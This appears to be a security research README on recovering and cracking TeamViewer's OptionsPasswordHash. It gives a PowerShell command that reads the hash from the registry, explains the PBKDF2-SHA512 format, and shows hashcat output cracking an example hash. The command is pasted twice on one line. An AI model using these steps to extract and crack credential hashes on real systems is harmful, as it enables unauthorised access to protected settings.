# TeamViewer: The Remote Desktop Software

TeamViewer stores information in the registry to authenticate users connecting. In past versions, this was very rudamentary and easily broken (see https://whynotsecurity.com/blog/teamviewer/ for more information, CVE-2019-18988), but has been improved since then.
This repository focuses on the OptionsPasswordHash value, which is used to restrict actions users can peform through the TeamViewer interface. Knowing this value may aid an attacker who already has access to a computer, but is unlikely to be useful for any remote attacks.

The location of this value is `HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer\OptionsPasswordHash`, though it should be noted that if it does not exist, chances are the Options password has not been set. You can retrieve this value in a single command:
```psh
(Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer\ | Select-Object -ExpandProperty OptionsPasswordHash |  ForEach-Object { '{0:x2}' -f $_ }) -join ''(Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer\ | Select-Object -ExpandProperty OptionsPasswordHash |  ForEach-Object { '{0:x2}' -f $_ }) -join ''
```

## The value itself

An example hash generated on my computer with a password of `password` is:
```
01030140000000879378ea5c917fca9172da3677251c6019a2d28ea7f3e1b9a68d1a2c6b93c003f6f023d8e59db002d9eaf1c643002abbeb8c946a5ff1f8270ac3f6387b30326b021000000067e6ce29d951ffc9f4bcf2984f61a2fc030400000010270000
```

The value has an encoding I am not familiar with and not bothered to reverse, but it is clearly made up of three parts, seperated by length indicators.
1. With a length of 0x40 (64 bytes) is the hash itself: `879378ea5c917fca9172da3677251c6019a2d28ea7f3e1b9a68d1a2c6b93c003f6f023d8e59db002d9eaf1c643002abbeb8c946a5ff1f8270ac3f6387b30326b`.
2. With a length of 0x10 (16 bytes) is the salt: `67e6ce29d951ffc9f4bcf2984f61a2fc`.
3. With a length of 0x04 (maybe?) is the rounds count: `1027` (decimal: 10,000).

## Hash type

The hash is simply PBKDF2-HMAC-SHA512 with those values used. For a quick verification with this example hash, you can use Cyberchef: https://gchq.github.io/CyberChef/#recipe=Derive_PBKDF2_key(%7B'option':'UTF8','string':'password'%7D,512,10000,'SHA512',%7B'option':'Hex','string':'67e6ce29d951ffc9f4bcf2984f61a2fc'%7D)

## Cracking with hashcat

Since this is a well known hash type, we can use Hashcat to crack it. Included is a simple conversion script that will verify the value is in a format we expect, then convert it to a hashcat compatible hash of type 20200 (pbkdf2-sha512):
```
PS > .\hashcat.exe -m 20200 -a 0 '$pbkdf2-sha512$10000$Z.bOKdlR/8n0vPKYT2Gi/A$h5N46lyRf8qRcto2dyUcYBmi0o6n8.G5po0aLGuTwAP28CPY5Z2wAtnq8cZDACq764yUal/x.CcKw/Y4ezAyaw' .\wordlist.txt
hashcat (v6.2.5) starting
[...]

$pbkdf2-sha512$10000$Z.bOKdlR/8n0vPKYT2Gi/A$h5N46lyRf8qRcto2dyUcYBmi0o6n8.G5po0aLGuTwAP28CPY5Z2wAtnq8cZDACq764yUal/x.CcKw/Y4ezAyaw:password

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20200 (Python passlib pbkdf2-sha512)
```
